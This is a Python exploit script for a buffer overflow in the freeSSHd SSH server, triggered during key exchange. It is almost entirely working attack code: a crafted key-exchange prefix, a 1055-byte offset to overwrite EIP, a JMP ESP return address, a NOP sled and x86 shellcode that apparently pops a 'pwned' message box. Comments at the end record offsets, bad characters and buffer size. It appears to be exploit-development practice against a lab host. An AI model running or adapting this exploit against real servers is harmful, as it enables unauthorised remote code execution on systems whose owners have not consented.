#! /usr/bin/python3


# freeSSHd Buffer Overflow Exploit

# Buffer Overflow occurs during SSH Key Exchange Algorithm

# Buffer Construction:

# key_exchange_data = "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
#                     "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
#                     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"

# buffer = key_exchange_data + exploit_input + \r\n


import socket
import time


host = "192.168.1.20"
ssh_port = 22

junk_data = bytearray(b"A" * 1055)
return_address = bytearray(b"\x53\x93\x42\x7e")
nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)
shellcode = (
    b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
    b"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
    b"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
    b"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
    b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
    b"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
    b"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
    b"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
    b"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
    b"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
    b"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
    b"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
    b"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
    b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x58\x20\x20\x20\x68\x62\x79"
    b"\x65\x21\x68\x47\x6f\x6f\x64\x31\xdb\x88\x5c\x24\x08\x89\xe3"
    b"\x68\x21\x58\x20\x20\x68\x6f\x68\x69\x74\x68\x62\x79\x20\x52"
    b"\x68\x6e\x65\x64\x20\x68\x6e\x20\x70\x77\x68\x20\x62\x65\x65"
    b"\x68\x68\x61\x76\x65\x68\x59\x6f\x75\x20\x31\xc9\x88\x4c\x24"
    b"\x1d\x89\xe1\x31\xd2\x6a\x30\x53\x51\x52\xff\xd0\x31\xc0\x50"
    b"\xff\x55\x08"
)
junk_data_2 = bytearray(b"C" * (22000 - len(shellcode) - nop_num_bytes - len(junk_data)))

buffer = junk_data + return_address + nop_sled + shellcode + junk_data_2

def sendExploit(buffer, host, port):

    key_exchange_prefix = (
        b"\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
        b"\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"
    )

    key_exchange_prefix = bytearray(key_exchange_prefix)

    suffix = bytearray("\r\n".encode("ascii"))

    exploit_input = key_exchange_prefix + buffer + suffix

    csocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    csocket.connect((host, port))

    print(f"[+] Data recevied from SSH server: {(csocket.recv(1000)).decode()}", end="")

    print("[!] Sending exploit...")

    csocket.send(exploit_input)

    print("[+] Exploit Sent!")

    time.sleep(5)

    csocket.close()
     

sendExploit(buffer, host, ssh_port)


# Comments:

# EIP during pattern crash: 326A4231
# ESP during pattern crash: 00127B20 -> 6A42346A


# EIP Offset: 1055
# ESP Offset: 1063

# Since ESP points somwhere in input data
# we can use `JMP ESP` instruction as return address.

# `JMP ESP` Address: 7E429353

# Bad characters - 0x00

# Always have to send around 22000 bytes, even if you
# successfully overwrite EIP with just 1055 bytes.
